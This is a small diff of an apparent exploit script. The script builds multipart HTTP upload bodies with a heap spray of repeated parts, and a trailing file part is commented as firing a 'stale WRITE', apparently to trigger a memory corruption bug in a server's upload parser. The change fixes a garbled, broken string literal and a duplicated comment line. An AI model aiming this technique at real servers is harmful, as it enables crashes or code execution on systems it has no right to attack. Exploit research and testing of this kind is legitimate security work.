@@ -19,9 +19,7 @@ def build(sid, spray_len, nspray, chunks, stall_after_c1=True):
     for _ in range(nspray):
         tail += part('t[]', spray) + b'\r\n'
     tail += b'--' + B + b'--\r\n'
-    tail += part('g', b'C' * 64, 'b') + b'
-'   # second file: fires stale WRITE
-'   # second file: fires stale WRITE
+    tail += part('g', b'C' * 64, 'b') + b'\r\n'   # second file: fires stale WRITE
     return pre + c1, tail
 
 def send(host, port, phase1, tail, stall):
